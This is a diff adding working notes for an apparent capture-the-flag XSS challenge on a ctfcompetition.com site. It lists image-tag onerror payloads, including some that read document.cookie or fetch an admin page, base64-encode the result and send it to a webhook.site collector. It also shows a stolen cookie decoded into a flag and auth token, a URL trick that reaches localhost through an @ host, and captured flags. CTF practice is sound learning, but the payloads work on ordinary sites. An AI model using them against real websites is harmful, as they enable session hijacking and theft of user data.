@@ -3,3 +3,36 @@
 <img src="x" onrerror="eval('confirm(1)');">
 <img src="x" onrerror="alert(1)">
 <img src="x" onrerror="confirm(1)">
+
+
+<img src="https://497cc728.ngrok.io/eaeae" />
+<img src="https://webhook.site/91f5761f-3687-4a74-bf6f-f40cb252bf09" onload="console.log(document.cookie)"/>
+
+<img src=sdf onerror="$.get('https://webhook.site/91f5761f-3687-4a74-bf6f-f40cb252bf09/?a=' + btoa(document.cookie))"/>
+
+admin: ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg==
+
+echo -n "ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg==" | base64 --decode
+flag=CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}; auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz
+
+
+
+
+
+
+flag2
+
+
+
+
+http://cwo-xss.web.ctfcompetition.com/admin/controls
+
+<img src=sdf onerror="$.get('http://cwo-xss.web.ctfcompetition.com/admin/controls',function(data){$.get('https://webhook.site/91f5761f-3687-4a74-bf6f-f40cb252bf09/?a='+btoa(data))})"/>
+
+
+
+http://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com/watch?livestream=https://cwo-xss.web.ctfcompetition.com/livestream/garden-livestream.webm
+
+http://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com@localhost/admin/controls
+
+ CTF{WhatIsThisCookieFriendSpaceBookPlusAllAccessRedPremiumThingLooksYummy} 
